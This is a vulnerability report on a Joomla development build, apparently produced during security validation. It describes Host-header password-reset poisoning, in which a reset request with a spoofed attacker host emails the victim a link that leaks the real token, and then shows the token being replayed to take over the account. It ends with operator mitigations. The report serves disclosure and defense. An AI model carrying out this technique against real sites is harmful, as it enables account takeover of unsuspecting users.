# VULN-004 — Host-header password-reset-link poisoning -> account takeover

**Software**: Joomla! CMS
**Repository**: https://github.com/joomla/joomla-cms
**Affected version**: 5.4.9-rc2-dev (libraries/src/Version.php; commit-pinned, no tagged release)
**Status**: CONFIRMED (full end-to-end ATO — poisoned link delivers the real token; replay changes the victim's password)
**Severity (static)**: Medium (potential High)
**Confidence**: 8/10
**Confidence reasoning**: End-to-end proven incl. password change + login as the victim; a real attack additionally needs the deployment to forward an arbitrary Host (common) and the victim to click the link (UI:R).
**Target commit**: a8bd3564ef52e830069aeb91286c2fd67bb3872d
**Validated at**: 2026-10-02

## Preconditions
- A victim with a known/enumerable email (exploit creates a Manager victim). Unauthenticated attacker.
- A **consistent** spoofed Host across the attacker's form-GET and reset.request-POST (what a real attacker's browser naturally does).

## Request / Response
See `request.http` / `response.txt` / `evidence/poisoned_reset_mail.eml` / `run.log`.
- `POST reset.request` with `Host: attacker.evil.example` → 303.
- Captured victim mail link: `http://attacker.evil.example/index.php/component/users/reset?layout=confirm&token=534f855468bfc7c891aa54328bbeea00` (attacker host + real token).
- Replay (`reset.confirm` + `reset.complete`) → victim password hash changed → login as victim succeeds.

## Observation
Confirmed as described, with one important nuance discovered dynamically: the reset link's host is taken from `HTTP_HOST` (via `Uri::getInstance()` → `Route::link(absolute=true)`, which ignores `live_site`), so a reset submitted with `Host: attacker.evil.example` yields a victim email pointing at the attacker host but carrying the victim's **real** single-use token. The attacker then replays `reset.confirm(username, token)` + `reset.complete(newpassword)` on the real host and the victim's password is changed (verified: stored hash changed and the attacker logs in as the victim).

Nuance: the attack requires a **consistent** spoofed Host. If the attacker fetches the form on the real host but POSTs with a spoofed Host, the per-host session/CSRF token is incoherent and `checkToken` fails (no mail). Using the spoofed Host for both the form GET (via the canonical SEF URL `/index.php/component/users/reset`, which does not redirect) and the POST makes the session coherent and the attack succeeds — exactly what a real attacker's browser does. This is not a mitigation; it is just the correct way to perform the attack.

## Side effects
- Creates a victim user `victim_<rand>` and CHANGES its password (that is the takeover). Random suffix keeps runs independent. Cleanup hint: remove `victim_*` users.

## Research & references
- PortSwigger "Password reset poisoning" (Web Security Academy) — the canonical technique: submit a reset with a spoofed Host so the emailed link points at an attacker host carrying the real token; applied here with the consistent-Host refinement.
- OWASP WSTG-ATHN-09 / Host Header Injection; CWE-644, CWE-640.
- Partial overlap CVE-2026-48902 (scheme half, fixed 5.4.6); the host sink (`Route::link` ignoring `live_site`) is not advisory-closed.

## If NEEDS_MANUAL
The only non-automated element of a real attack is the **victim clicking** the poisoned link (UI:R) and the deployment forwarding an arbitrary Host to PHP (common on default/catch-all vhosts). Everything else — link poisoning and token replay → password change — is proven here. Operator mitigation: set `live_site` AND reject unexpected Host headers at the web server (note: setting `live_site` alone does NOT help because `Route::link` ignores it).
